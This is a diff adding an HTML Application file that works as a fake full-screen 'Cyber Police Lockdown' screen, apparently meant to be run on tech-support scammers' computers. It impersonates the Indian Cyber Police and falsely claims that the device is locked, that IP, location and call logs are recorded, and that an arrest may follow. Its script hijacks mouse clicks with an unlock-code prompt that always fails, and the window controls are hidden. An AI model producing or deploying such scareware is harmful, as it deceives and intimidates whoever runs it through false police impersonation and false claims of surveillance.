@@ -1,0 +1,62 @@
+<html>
+<head>
+	<title>Device Lockdown</title>
+	<style>
+		body {
+			background-image: url('background-warn.png');
+			color: white;
+			font-family: sans-serif;
+		}
+	</style>
+</head>
+
+<hta:application id="oBVC" 
+applicationname="LOCK"  
+version="1.0" 
+maximizebutton="no" 
+minimizebutton="no" 
+sysmenu="no" 
+Caption="no" 
+windowstate="maximize"/>
+
+<body scroll="no">
+	<h1 align="center" style="font-size:108; margin-bottom:0px">CYBER POLICE LOCKDOWN</h1>
+	<p align="center" style="font-size:70; margin-top:0px">FRAUDULENT ACTIVITY DETECTED</p>
+	<br/>
+	<h1 style="padding-left:20px">ATTENTION:</h1>
+	<p style="padding-left:20px">
+		This device has been locked by the <strong>Indian Cyber Police</strong> due to its involvement in fraudulent activities, including but not limited to:
+		<ul>
+			<li><strong>Tech Support Scams</strong> (Impersonating Microsoft, Google, Norton, Geek Squad, McAfee, or other companies)</li>
+			<li><strong>Refund Scams</strong> (Fake overpayments and remote access fraud)</li>
+			<li>Bank Fraud & Identity Theft</li>
+			<li>Illegal Use of Remote Access Tools</li>
+		</ul>
+		<div style="padding-left:20px">Your IP address, location, and call logs have been recorded. Authorities in your area have been notified.</div>
+	</p>
+	<p style="padding-left:20px">Scamming innocent people is a serious criminal offense that carries severe legal consequences. Fraudulent activities, such as tech support scams, refund scams, and phishing schemes, are not just unethical; they are illegal under international law and punishable by <strong>fines</strong>, <strong>asset seizure</strong>, and <strong>imprisonment</strong>. These scams exploit vulnerable individuals, often causing <strong>financial ruin</strong>, <strong>emotional distress</strong>, and <strong>identity theft</strong>. Law enforcement agencies (such as the Indian Cyber Police) actively track, expose, and prosecute scammers using advanced digital forensics. Participating in or facilitating scams - even as a call centre employee - can lead to arrests, travel bans, and criminal records that destroy future opportunities. The risks far outweigh any short-term profit, and justice always catches up with criminals.</p>
+	<br/><br/><br/>
+	<h1 style="padding-left:20px">WHAT TO DO NOW:</h1>
+	<p style="padding-left:20px; font-size:24">Your call centre, network, and computers are being monitored. Deleting files, turning off your device, or attempting to evade this lockdown may result in an automatic warrant for arrest. <strong>Do not attempt to move, hide, or destroy evidence.</strong> You must shut down your call centre, refund all your victims, and stop scamming innocent people.</p>
+	<br/><br/><br/><br/><br/><br/>
+	<footer><p align="center"><i>System lockdown is active. Unlocking your device without authorization from authorities is strictly prohibited.</i></p></footer>
+</body>
+
+<script language="javascript">
+	function noClick() {
+		if ((event.button==1)||(event.button==2)) {
+			//alert('Your device is locked. This lockdown is being enforced by the Indian Cyber Police. Enter the secret code to unlock your device.');
+			choice = confirm('Your device is locked. This lockdown is being enforced by the Indian Cyber Police. If you want to unlock your device, click the OK button and then enter the secret code.');
+			if (choice == 1) {
+				code = prompt('Enter the secret code to unlock your device.', '');
+				if ((code == null)||(code == '')) {
+					alert('No code was entered. Your device will remain in lockdown mode.');
+				} else {
+					alert('Incorrect code. Your device will not be unlocked.');
+				}
+			}
+		}
+	}
+	document.onmousedown=noClick
+</script>
+</html>
